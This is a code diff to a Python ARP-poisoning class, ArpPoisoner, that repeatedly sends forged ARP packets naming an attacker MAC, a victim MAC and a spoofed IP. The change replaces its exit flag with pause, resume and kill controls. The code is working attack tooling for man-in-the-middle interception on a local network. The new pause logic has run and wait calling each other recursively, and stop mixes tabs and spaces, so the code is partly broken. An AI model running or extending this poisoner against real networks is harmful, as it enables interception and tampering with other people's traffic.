@@ -13,7 +13,7 @@ class ArpPoisoner(multiprocessing.Process):
         self.interface = interface    #enp0s3
         self.packets = []    #The packets which will be used to spoof
 
-        self.exit = multiprocessing.Event()
+        self.paused = multiprocessing.Event()
 
     def add_packet(self, mac_attacker, mac_victim, ip_to_spoof, ip_victim):
         """"Creates an ARP packet that gets added to the packets list to be used for spoofing""" 
@@ -36,19 +36,37 @@ class ArpPoisoner(multiprocessing.Process):
     def run(self):
         """"Starts sending out the spoofing packets on the interface repeatedly. Will not stop by itself."""
 
-        self.exit.clear()
-
-        while not self.exit.is_set():
+        while not self.paused.is_set():
             
             for packet in self.packets:
                 sendp(packet, iface = self.interface, verbose=0)
             
             time.sleep(2)
 
-    def stop(self):
+        self.wait()
+
+    def wait(self):
+
+        while self.paused.is_set():
+              time.sleep(2)
+
+        self.run()
+
+    def go(self):
+
+        self.paused.clear()
+
+    def pause(self):
         """Stops the sending of the spoofing packets."""
 
-        self.exit.set()
+        self.paused.set()
+
+    def stop(self):
+
+	try:
+            self.kill()
+	except:
+	    pass
 
 def test_cb():
 
